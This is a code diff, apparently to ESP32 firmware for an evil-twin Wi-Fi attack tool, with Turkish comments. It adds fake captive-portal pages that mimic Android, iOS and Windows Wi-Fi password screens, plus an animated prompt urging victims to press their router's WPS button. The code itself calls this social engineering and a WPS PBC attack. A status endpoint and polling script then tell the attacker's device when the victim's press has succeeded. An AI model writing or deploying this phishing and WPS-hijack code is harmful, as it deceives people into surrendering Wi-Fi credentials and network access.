@@ -896,6 +896,228 @@ static String portal_wps_success_page() {
 // UA tespiti: iPhone/iPad → iOS tasarımı, diğer → Android MD3 tasarımı
 // Renk teması: prefers-color-scheme ile cihazdan otomatik alınır
 
+// ─── WPS + Modem Etiket Animasyon Bloğu ──────────────────────────────────────
+// Tüm portal sayfalarında ortak kullanılan animasyonlu açıklama kutusu.
+// 3 kare döngüsü: ön yüz → arka etiket → WPS tuşu (9 saniye)
+static String portal_wps_hint() {
+  return F(
+    "<div style='"
+      "background:#F7F7F7;border:1px solid #CCCCCC;border-radius:8px;"
+      "padding:11px 13px;margin:12px 0 0;text-align:left;"
+      "font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif'"
+    ">"
+      "<div style='display:flex;align-items:flex-start;gap:10px'>"
+        "<span style='"
+          "background:#1565C0;color:#fff;font-size:10px;font-weight:700;"
+          "padding:3px 7px;border-radius:4px;letter-spacing:.3px;"
+          "flex-shrink:0;margin-top:1px;line-height:16px'"
+        ">WPS</span>"
+        "<div>"
+          "<div style='font-size:12.5px;font-weight:600;color:#1A1A1A;line-height:1.35'>"
+            "&#350;ifresiz ba&#287;lanmak i&#231;in"
+          "</div>"
+          "<div style='font-size:11.5px;color:#555;margin-top:3px;line-height:1.5'>"
+            "Modemdeki <b style='color:#1565C0'>WPS</b>"
+            " tu&#351;una <b>3&#8211;5 saniye</b> bas&#305;n."
+            " Ba&#287;lant&#305; otomatik kurulacakt&#305;r."
+          "</div>"
+        "</div>"
+      "</div>"
+      "<div id='_wpsBnr' style='"
+        "display:none;margin-top:9px;"
+        "background:#DBEEFF;border:1px solid #90CAF9;border-radius:5px;"
+        "padding:8px 12px;font-size:12px;color:#1565C0;"
+        "font-weight:600;text-align:center'"
+      ">"
+        "&#8635;&nbsp;WPS ile ba&#287;lan&#305;l&#305;yor..."
+        " L&#252;tfen bekleyin"
+      "</div>"
+    "</div>"
+  );
+}
+
+static String portal_wps_anim_block() {
+  return portal_wps_hint();
+  String h = F(
+    "<div style='"
+      "background:#fff8e1;border:2px solid #ffb300;border-radius:14px;"
+      "padding:14px 14px 10px;margin:14px 0 6px;font-family:inherit"
+    "'>"
+
+    // Başlık notu
+    "<div style='display:flex;align-items:center;gap:8px;margin-bottom:10px'>"
+      "<span style='font-size:22px'>&#128161;</span>"
+      "<div>"
+        "<div style='font-size:.88em;font-weight:700;color:#5d3a00;line-height:1.35'>"
+          "WiFi &#351;ifrenizi bilmiyorsan&#305;z, modemdeki"
+          " <span style='color:#1565c0'>WPS tu&#351;una</span>"
+          " basarak ba&#287;lanabilirsiniz!"
+        "</div>"
+        "<div style='font-size:.73em;color:#7d5a00;margin-top:2px'>"
+          "Hi&#231;bir &#351;ifre girmenize gerek yok &#8212;"
+          " sadece tu&#351;a 3-5 saniye bast&#305;r&#305;n."
+        "</div>"
+      "</div>"
+    "</div>"
+
+    // Animasyon konteyneri (9s döngü: ön → arka etiket → WPS tuşu)
+    "<div style='position:relative;height:168px;overflow:hidden;"
+      "border-radius:10px;background:#f5f5f5;border:1px solid #e0e0e0'>"
+
+    // ── KARE 1: Modem ön yüzü ─────────────────────────────────────────────
+    "<div class='waf waf1'>"
+      "<div style='text-align:center;padding-top:6px'>"
+        "<svg width='130' height='112' viewBox='0 0 130 112' xmlns='http://www.w3.org/2000/svg'>"
+          // Gövde
+          "<rect x='20' y='18' width='90' height='72' rx='8' fill='#37474f'/>"
+          "<rect x='24' y='22' width='82' height='64' rx='6' fill='#455a64'/>"
+          // LED ışıkları
+          "<circle cx='36' cy='34' r='4' fill='#4caf50'/>"
+          "<circle cx='48' cy='34' r='4' fill='#4caf50'/>"
+          "<circle cx='60' cy='34' r='4' fill='#ff9800' opacity='.7'/>"
+          "<circle cx='72' cy='34' r='4' fill='#f44336' opacity='.5'/>"
+          // Antenler
+          "<rect x='38' y='4' width='5' height='18' rx='2.5' fill='#78909c'/>"
+          "<rect x='87' y='4' width='5' height='18' rx='2.5' fill='#78909c'/>"
+          // WPS tuşu
+          "<rect x='38' y='60' width='54' height='18' rx='9' fill='#1565c0'/>"
+          "<text x='65' y='72' text-anchor='middle' fill='white' "
+            "font-size='9' font-weight='bold' font-family='Arial'>WPS</text>"
+          // Etiket oku
+          "<path d='M65 90 L65 100' stroke='#ff6f00' stroke-width='2.5' stroke-linecap='round'/>"
+          "<polygon points='65,106 60,98 70,98' fill='#ff6f00'/>"
+        "</svg>"
+        "<div style='font-size:.72em;font-weight:700;color:#37474f;margin-top:2px'>"
+          "&#128225; Modeminizi bulun"
+        "</div>"
+      "</div>"
+    "</div>"
+
+    // ── KARE 2: Modem arka yüzü (etiket) ──────────────────────────────────
+    "<div class='waf waf2'>"
+      "<div style='text-align:center;padding-top:4px'>"
+        "<svg width='150' height='108' viewBox='0 0 150 108' xmlns='http://www.w3.org/2000/svg'>"
+          // Modem arkası (boxy, basık)
+          "<rect x='10' y='10' width='130' height='72' rx='8' fill='#37474f'/>"
+          "<rect x='14' y='14' width='122' height='64' rx='6' fill='#455a64'/>"
+          // Etiket / sticker (beyaz dikdörtgen)
+          "<rect x='22' y='20' width='106' height='50' rx='4' fill='white' "
+            "stroke='#bdbdbd' stroke-width='1'/>"
+          // Etiket metinleri
+          "<text x='75' y='35' text-anchor='middle' fill='#333' "
+            "font-size='7.5' font-weight='bold' font-family='Arial'>MODEM ETİKETİ</text>"
+          "<line x1='28' y1='38' x2='122' y2='38' stroke='#e0e0e0' stroke-width='.8'/>"
+          "<text x='28' y='48' fill='#555' font-size='7' font-family='Arial'>WiFi Ad&#305;:</text>"
+          "<text x='65' y='48' fill='#1565c0' font-size='7' font-weight='bold' font-family='Arial'>"
+            "HOME_WIFI</text>"
+          "<text x='28' y='59' fill='#555' font-size='7' font-family='Arial'>WiFi &#350;ifre:</text>"
+          "<text x='65' y='59' fill='#2e7d32' font-size='7' font-weight='bold' font-family='Arial'>"
+            "abc123xyz</text>"
+          // Şifre vurgusu
+          "<rect x='63' y='52' width='58' height='10' rx='2' fill='#fff176' opacity='.6'/>"
+          "<text x='28' y='70' fill='#888' font-size='6.5' font-family='Arial'>"
+            "WPA Key / Password / &#350;ifre</text>"
+          // Parlayan oklar (şifreye doğru)
+          "<path d='M118 59 L126 59' stroke='#f44336' stroke-width='2' "
+            "stroke-linecap='round' marker-end='url(#arr)'/>"
+          "<defs><marker id='arr' markerWidth='4' markerHeight='4' "
+            "refX='3' refY='2' orient='auto'>"
+            "<path d='M0,0 L4,2 L0,4' fill='#f44336'/>"
+          "</marker></defs>"
+          // Ok + "Çevirin" metni
+          "<text x='75' y='96' text-anchor='middle' fill='#ff6f00' "
+            "font-size='8' font-weight='bold' font-family='Arial'>"
+            "&#8593; Modemi &#231;evirin &#8212; arka etikette &#351;ifrenizi g&#246;r&#252;n"
+          "</text>"
+        "</svg>"
+        "<div style='font-size:.72em;font-weight:700;color:#2e7d32;margin-top:0px'>"
+          "&#128274; &#350;ifreniz etikette yaz&#305;yor &#8212; bulup girebilirsiniz"
+        "</div>"
+      "</div>"
+    "</div>"
+
+    // ── KARE 3: WPS tuşu yakın plan ───────────────────────────────────────
+    "<div class='waf waf3'>"
+      "<div style='text-align:center;padding-top:8px'>"
+        "<svg width='150' height='100' viewBox='0 0 150 100' xmlns='http://www.w3.org/2000/svg'>"
+          // Modem gövdesi (kırpılmış)
+          "<rect x='10' y='8' width='130' height='60' rx='8' fill='#37474f'/>"
+          "<rect x='14' y='12' width='122' height='52' rx='6' fill='#455a64'/>"
+          // WPS tuşu (büyük, parlayan)
+          "<rect x='42' y='24' width='66' height='28' rx='14' fill='#1565c0'/>"
+          "<rect x='42' y='24' width='66' height='28' rx='14' fill='none' "
+            "stroke='#42a5f5' stroke-width='3' opacity='.8'>"
+            "<animate attributeName='stroke-width' values='2;5;2' dur='1.2s' repeatCount='indefinite'/>"
+            "<animate attributeName='opacity' values='.5;1;.5' dur='1.2s' repeatCount='indefinite'/>"
+          "</rect>"
+          // WPS ikonu (daire+ok stilize)
+          "<circle cx='57' cy='38' r='8' fill='none' stroke='white' stroke-width='2'/>"
+          "<path d='M57 30 L57 27' stroke='white' stroke-width='2.5' stroke-linecap='round'/>"
+          "<text x='70' y='42' fill='white' font-size='10' font-weight='bold' font-family='Arial'>"
+            "WPS"
+          "</text>"
+          // Parmak / basma göstergesi
+          "<text x='75' y='78' text-anchor='middle' fill='#ff6f00' "
+            "font-size='11' font-family='Arial'>&#128072;</text>"
+          // Animasyonlu ok (yukarı doğru)
+          "<path d='M75 90 L75 80' stroke='#ff6f00' stroke-width='2.5' stroke-linecap='round'>"
+            "<animate attributeName='d' "
+              "values='M75,92 L75,82;M75,88 L75,78;M75,92 L75,82' "
+              "dur='.9s' repeatCount='indefinite'/>"
+          "</path>"
+          "<polygon points='75,77 71,84 79,84' fill='#ff6f00'>"
+            "<animate attributeName='points' "
+              "values='75,77 71,84 79,84;75,73 71,80 79,80;75,77 71,84 79,84' "
+              "dur='.9s' repeatCount='indefinite'/>"
+          "</polygon>"
+          // Süre etiketi
+          "<rect x='88' y='18' width='50' height='16' rx='4' fill='#ff6f00'/>"
+          "<text x='113' y='29' text-anchor='middle' fill='white' "
+            "font-size='7.5' font-weight='bold' font-family='Arial'>3-5 saniye bas!</text>"
+        "</svg>"
+        "<div style='font-size:.72em;font-weight:700;color:#1565c0;margin-top:0px'>"
+          "WPS tu&#351;una 3-5 saniye bas &#8212; &#351;ifre gerekmez! &#10003;"
+        "</div>"
+      "</div>"
+    "</div>"
+
+    "</div>" // anim container
+
+    // Küçük adım özeti
+    "<div style='display:flex;gap:6px;margin-top:8px;font-size:.7em'>"
+      "<div style='flex:1;background:#e3f2fd;border-radius:8px;padding:6px 4px;"
+        "text-align:center;color:#1565c0;font-weight:600;line-height:1.3'>"
+        "&#128270;<br>Modemi<br>bulun"
+      "</div>"
+      "<div style='align-self:center;color:#bbb;font-size:1.2em'>&#8250;</div>"
+      "<div style='flex:1;background:#f3e5f5;border-radius:8px;padding:6px 4px;"
+        "text-align:center;color:#6a1b9a;font-weight:600;line-height:1.3'>"
+        "&#128196;<br>Arka etiket<br>&#351;ifreyi okuyun"
+      "</div>"
+      "<div style='align-self:center;color:#bbb;font-size:1.2em'>&#8250;</div>"
+      "<div style='flex:1;background:#e8f5e9;border-radius:8px;padding:6px 4px;"
+        "text-align:center;color:#2e7d32;font-weight:600;line-height:1.3'>"
+        "&#128275;<br>WPS tu&#351;una<br>3-5 sn bas"
+      "</div>"
+    "</div>"
+
+    "</div>" // outer box
+
+    "<style>"
+    ".waf{position:absolute;top:0;left:0;width:100%;height:100%;"
+      "display:flex;align-items:center;justify-content:center}"
+    "@keyframes waf3s{"
+      "0%,28%{opacity:1}"
+      "33%,100%{opacity:0}"
+    "}"
+    ".waf1{animation:waf3s 9s linear infinite 0s}"
+    ".waf2{animation:waf3s 9s linear infinite -6s}"
+    ".waf3{animation:waf3s 9s linear infinite -3s}"
+    "</style>"
+  );
+  return h;
+}
+
 static String portal_android(bool wrong_pass, const String &ssid) {
   // Material Design 3 — ekran görüntüsündeki Android WiFi şifre ekranı
   String h = F("<!DOCTYPE html><html><head>"
@@ -986,15 +1208,14 @@ static String portal_android(bool wrong_pass, const String &ssid) {
       "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
       "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
     "</div>"
-    "</form>"
-    "<p style='font-size:12px;color:var(--hint);text-align:center;"
-      "margin-top:18px;padding:0 16px;line-height:1.5;opacity:.75'>"
-      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
-    "</p>"
-    "<script>function togglePw(){"
-      "var p=document.getElementById('pw');"
-      "p.type=p.type==='password'?'text':'password'"
-    "}</script>"
+    "</form>");
+  h += portal_wps_hint();
+  h += F("<script>"
+    "function togglePw(){var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password';}"
+    "setInterval(function(){fetch('/et_wps_pbc_status').then(function(r){return r.json();})"
+    ".then(function(d){if(d.f){location.href='/portal';}var b=document.getElementById('_wpsBnr');"
+    "if(b)b.style.display=d.r?'block':'none';}).catch(function(){});},4000);"
+    "</script>"
     "</body></html>");
   return h;
 }
@@ -1080,16 +1301,15 @@ static String portal_ios(bool wrong_pass, const String &ssid) {
           "<button type='button' class='eye-ios' onclick='togglePw()'>&#128065;</button>"
         "</div>"
       "</div>"
-    "</form>"
-    "<p style='font-size:12px;color:var(--text2);text-align:center;"
-      "margin:16px 16px 0;line-height:1.5;opacity:.7'>"
-      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
-    "</p>"
-    "</div>"
-    "<script>function togglePw(){"
-      "var p=document.getElementById('pw');"
-      "p.type=p.type==='password'?'text':'password'"
-    "}</script>"
+    "</form>");
+  h += portal_wps_hint();
+  h += F("</div>"
+    "<script>"
+    "function togglePw(){var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password';}"
+    "setInterval(function(){fetch('/et_wps_pbc_status').then(function(r){return r.json();})"
+    ".then(function(d){if(d.f){location.href='/portal';}var b=document.getElementById('_wpsBnr');"
+    "if(b)b.style.display=d.r?'block':'none';}).catch(function(){});},4000);"
+    "</script>"
     "</body></html>");
   return h;
 }
@@ -1210,16 +1430,15 @@ static String portal_desktop(bool wrong_pass, const String &ssid) {
         "<button type='button' class='btn btn-cancel' onclick='history.back()'>&#304;ptal</button>"
         "<button type='submit' class='btn btn-connect'>Ba&#287;lan</button>"
       "</div>"
-    "</form>"
-    "<p style='font-size:11px;color:var(--text2);text-align:center;"
-      "margin-top:14px;line-height:1.5;opacity:.7'>"
-      "* &#350;ifre modemin arkas&#305;ndaki etikette yazar."
-    "</p>"
-    "</div>"
-    "<script>function togglePw(){"
-      "var p=document.getElementById('pw');"
-      "p.type=p.type==='password'?'text':'password'"
-    "}</script>"
+    "</form>");
+  h += portal_wps_hint();
+  h += F("</div>"
+    "<script>"
+    "function togglePw(){var p=document.getElementById('pw');p.type=p.type==='password'?'text':'password';}"
+    "setInterval(function(){fetch('/et_wps_pbc_status').then(function(r){return r.json();})"
+    ".then(function(d){if(d.f){location.href='/portal';}var b=document.getElementById('_wpsBnr');"
+    "if(b)b.style.display=d.r?'block':'none';}).catch(function(){});},4000);"
+    "</script>"
     "</body></html>");
   return h;
 }
@@ -1248,8 +1467,14 @@ static void handle_portal() {
     server.send(200, "text/html", portal_wps_success_page());
     return;
   }
-  // Her durumda platform-specific sayfayı göster (Android/iOS/Windows tarzı).
-  // WPS PBC aktifse ilgili platform sayfası kendi WPS talimat kutusunu gösterir.
+  // WPS PBC aktifse: kombine WPS+şifre sayfası (6s oto-yenileme ile)
+  // Kullanıcı WPS tuşuna basınca sayfa otomatik güncellenir, başarı sayfası gelir.
+  if (et_wps_pbc_running) {
+    server.send(200, "text/html", portal_wps_page());
+    return;
+  }
+  // WPS aktif değil → platform'a özel portal (Android/iOS/Windows)
+  // Animasyon bloğu ile şifre yöntemi + WPS seçeneği açıklanır.
   server.send(200, "text/html", portal_page(false));
 }
 
@@ -1262,6 +1487,16 @@ static void handle_portal_wrong() {
 static void handle_portal_manual() {
   if (!evil_twin_active) { redirect_root(); return; }
   server.send(200, "text/html", portal_page(false));
+}
+
+// /et_wps_pbc_status → captive portal polling: WPS PBC durumu (running/found)
+static void handle_et_wps_pbc_status() {
+  String json = "{\"r\":";
+  json += et_wps_pbc_running ? "1" : "0";
+  json += ",\"f\":";
+  json += et_wps_pbc_found   ? "1" : "0";
+  json += "}";
+  server.send(200, "application/json", json);
 }
 
 // /wps_pbc_start → WPS PBC saldırısını başlat (yönetim sayfasından)
@@ -1594,6 +1829,7 @@ void start_web_interface() {
   server.on("/test_result",    HTTP_GET,  handle_test_result);
 
   // WPS PBC sosyal mühendislik
+  server.on("/et_wps_pbc_status", HTTP_GET,  handle_et_wps_pbc_status);
   server.on("/wps_pbc_start",  HTTP_POST, handle_wps_pbc_start);
   server.on("/wps_pbc_stop",   HTTP_POST, handle_wps_pbc_stop);
 
